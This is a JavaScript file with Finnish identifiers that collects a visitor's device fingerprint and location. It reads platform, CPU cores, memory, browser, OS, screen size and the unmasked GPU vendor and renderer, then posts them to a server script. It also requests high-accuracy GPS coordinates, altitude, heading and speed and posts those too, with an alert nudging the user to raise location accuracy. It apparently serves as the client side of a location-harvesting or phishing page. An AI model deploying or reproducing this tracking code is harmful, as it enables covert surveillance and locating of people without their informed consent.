function informaatio() {
  var alusta = navigator.platform;
  var ytimet = navigator.hardwareConcurrency;
  var muisti = navigator.deviceMemory;
  var versio = navigator.userAgent;
  var selain = versio;
  var kayttis = versio;
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var valmistaja;
  var renderointi;

  if (ytimet == undefined) {
    ytimet = 'Ei saatavilla';
  }

  if (muisti == undefined) {
    muisti = 'Ei saatavilla';
  }

  if (versio.indexOf('Firefox') != -1) {
    selain = selain.substring(selain.indexOf(' Firefox/') + 1);
    selain = selain.split(' ');
    selain = selain[0];
  }
  else if (versio.indexOf('Chrome') != -1) {
    selain = selain.substring(selain.indexOf(' Chrome/') + 1);
    selain = selain.split(' ');
    selain = selain[0];
  }
  else if (versio.indexOf('Safari') != -1) {
    selain = selain.substring(selain.indexOf(' Safari/') + 1);
    selain = selain.split(' ');
    selain = selain[0];
  }
  else if (versio.indexOf('Edge') != -1) {
    selain = selain.substring(selain.indexOf(' Edge/') + 1);
    selain = selain.split(' ');
    selain = selain[0];
  }
  else {
    selain = 'Ei saatavilla';
  }

  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    valmistaja = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    renderointi = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (valmistaja == undefined) {
    valmistaja = 'Ei saatavilla';
  }
  if (renderointi == undefined) {
    renderointi = 'Ei saatavilla';
  }

  var korkeus = window.screen.height;
  var leveys = window.screen.width;
  kayttis = kayttis.substring(0, kayttis.indexOf(')'));
  kayttis = kayttis.split(';');
  kayttis = kayttis[1];
  if (kayttis == undefined) {
    kayttis = 'Ei saatavilla';
  }
  kayttis = kayttis.trim();

  $.ajax({
    type: 'POST',
    url: 'info_handler.php',
    data: { Alusta: alusta, Selain: selain, Ytimet: ytimet, Muisti: muisti, Valmistaja: valmistaja, Renderointi: renderointi, Korkeus: korkeus, Leveys: leveys, Kayttis: kayttis },
    success: function () { },
    mimeType: 'text'
  });
}

function paikanna(callback, virheCallback) {
  if (navigator.geolocation) {
    var asetukset = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(naytaPaikka, naytaVirhe, asetukset);
  }

  function naytaVirhe(virhe) {
    var virheTeksti;
    var virheTila = 'epäonnistui';

    switch (virhe.code) {
      case virhe.PERMISSION_DENIED:
        virheTeksti = 'Käyttäjä esti sijainnin käytön';
        break;
      case virhe.POSITION_UNAVAILABLE:
        virheTeksti = 'Sijaintitiedot eivät ole saatavilla';
        break;
      case virhe.TIMEOUT:
        virheTeksti = 'Sijainnin haku aikakatkaistiin';
        alert('Aseta sijaintitila korkealle tarkkuudelle...');
        break;
      case virhe.UNKNOWN_ERROR:
        virheTeksti = 'Tapahtui tuntematon virhe';
        break;
    }

    $.ajax({
      type: 'POST',
      url: 'error_handler.php',
      data: { Tila: virheTila, Virhe: virheTeksti },
      success: virheCallback(virhe, virheTeksti),
      mimeType: 'text'
    });
  }
  function naytaPaikka(paikka) {
    var leveysaste = paikka.coords.latitude;
    if (leveysaste) {
      leveysaste = leveysaste + ' astetta';
    } else {
      leveysaste = 'Ei saatavilla';
    }
    var pituusaste = paikka.coords.longitude;
    if (pituusaste) {
      pituusaste = pituusaste + ' astetta';
    } else {
      pituusaste = 'Ei saatavilla';
    }
    var tarkkuus = paikka.coords.accuracy;
    if (tarkkuus) {
      tarkkuus = tarkkuus + ' m';
    } else {
      tarkkuus = 'Ei saatavilla';
    }
    var korkeus = paikka.coords.altitude;
    if (korkeus) {
      korkeus = korkeus + ' m';
    } else {
      korkeus = 'Ei saatavilla';
    }
    var suunta = paikka.coords.heading;
    if (suunta) {
      suunta = suunta + ' astetta';
    } else {
      suunta = 'Ei saatavilla';
    }
    var nopeus = paikka.coords.speed;
    if (nopeus) {
      nopeus = nopeus + ' m/s';
    } else {
      nopeus = 'Ei saatavilla';
    }

    var okTila = 'onnistui';

    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: { Tila: okTila, Leveysaste: leveysaste, Pituusaste: pituusaste, Tarkkuus: tarkkuus, Korkeus: korkeus, Suunta: suunta, Nopeus: nopeus },
      success: callback,
      mimeType: 'text'
    });
  };
}
